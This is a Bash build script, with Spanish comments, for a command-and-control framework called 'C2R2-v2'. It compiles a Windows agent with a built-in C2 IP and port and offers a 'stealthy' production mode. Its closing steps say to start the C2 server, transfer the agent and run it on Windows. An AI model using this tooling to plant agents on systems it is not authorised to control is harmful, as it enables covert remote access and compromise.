#!/bin/bash
# Script rápido para compilar todo con Docker
# Uso: ./docker-build.sh [opciones]

set -e

# Colores
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Banner
echo -e "${BLUE}╔════════════════════════════════════════╗${NC}"
echo -e "${BLUE}║   C2R2-v2 Docker Build System         ║${NC}"
echo -e "${BLUE}╚════════════════════════════════════════╝${NC}"
echo ""

# Valores por defecto
SERVER_IP=${SERVER_IP:-127.0.0.1}
SERVER_PORT=${SERVER_PORT:-4444}
AGENT_NAME=${AGENT_NAME:-agent}
PRODUCTION_MODE=${PRODUCTION_MODE:-false}
NO_CACHE=${NO_CACHE:-false}

# Parsear argumentos
while [[ $# -gt 0 ]]; do
    case $1 in
        --ip)
            SERVER_IP="$2"
            shift 2
            ;;
        --port)
            SERVER_PORT="$2"
            shift 2
            ;;
        --name)
            AGENT_NAME="$2"
            shift 2
            ;;
        --production)
            PRODUCTION_MODE=true
            shift
            ;;
        --no-cache)
            NO_CACHE=true
            shift
            ;;
        --help)
            echo "Uso: $0 [opciones]"
            echo ""
            echo "Opciones:"
            echo "  --ip IP           IP del servidor C2 (default: 127.0.0.1)"
            echo "  --port PORT       Puerto del servidor C2 (default: 4444)"
            echo "  --name NAME       Nombre del agente (default: agent)"
            echo "  --production      Compilar en modo producción (stealthy)"
            echo "  --no-cache        Forzar rebuild sin usar caché de Docker"
            echo "  --help            Mostrar esta ayuda"
            echo ""
            echo "Ejemplos:"
            echo "  $0 --ip 192.168.1.10 --port 4444"
            echo "  $0 --ip 203.0.113.50 --production"
            echo "  $0 --name agent-prod --production"
            exit 0
            ;;
        *)
            echo -e "${RED} Opción desconocida: $1${NC}"
            echo "Usa --help para ver opciones disponibles"
            exit 1
            ;;
    esac
done

# Mostrar configuración
echo -e "${YELLOW} Configuración de compilación:${NC}"
echo -e "   ${BLUE}•${NC} Servidor: ${GREEN}${SERVER_IP}:${SERVER_PORT}${NC}"
echo -e "   ${BLUE}•${NC} Agente: ${GREEN}${AGENT_NAME}.exe${NC}"
echo -e "   ${BLUE}•${NC} Modo: ${GREEN}$([ "$PRODUCTION_MODE" = "true" ] && echo "PRODUCCIÓN (stealthy)" || echo "DESARROLLO (debug)")${NC}"
echo ""

# Confirmar
read -p "¿Continuar con la compilación? [Y/n] " -n 1 -r
echo
if [[ ! $REPLY =~ ^[Yy]$ ]] && [[ -n $REPLY ]]; then
    echo -e "${YELLOW}  Compilación cancelada${NC}"
    exit 0
fi

# Crear directorio dist si no existe
mkdir -p dist

# Compilar con Docker Compose
echo ""
echo -e "${BLUE} Compilando componentes...${NC}"
echo ""

# Añadir flag --no-cache si está activado
BUILD_FLAGS="--build"
if [ "$NO_CACHE" = "true" ]; then
    echo -e "${YELLOW}  Modo --no-cache activado (se ignorará caché de Docker)${NC}"
    COMPOSE_BUILD_FLAGS="--no-cache"
else
    COMPOSE_BUILD_FLAGS=""
fi

SERVER_IP=$SERVER_IP \
SERVER_PORT=$SERVER_PORT \
AGENT_NAME=$AGENT_NAME \
PRODUCTION_MODE=$PRODUCTION_MODE \
docker-compose build $COMPOSE_BUILD_FLAGS && docker-compose up

# Verificar resultados
echo ""
echo -e "${GREEN} Compilación completada!${NC}"
echo ""
echo -e "${YELLOW} Binarios generados en dist/:${NC}"
find dist/ -maxdepth 1 -type f -exec ls -lh {} \; | while read -r line; do
    echo -e "   ${BLUE}•${NC} $line"
done

# Mostrar información
if [ -f dist/BUILD_INFO.txt ]; then
    echo ""
    echo -e "${YELLOW} Información de compilación:${NC}"
    sed 's/^/   /' < dist/BUILD_INFO.txt
fi

echo ""
echo -e "${GREEN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${GREEN} ¡Listo para usar!${NC}"
echo ""
echo -e "${YELLOW}Próximos pasos:${NC}"
echo -e "   ${BLUE}1.${NC} Inicia el servidor: ${GREEN}cd dist && ./c2r2-server --bind 0.0.0.0 --port ${SERVER_PORT}${NC}"
echo -e "   ${BLUE}2.${NC} Transfiere el agente: ${GREEN}dist/${AGENT_NAME}.exe${NC}"
echo -e "   ${BLUE}3.${NC} Ejecuta el agente en Windows"
echo ""
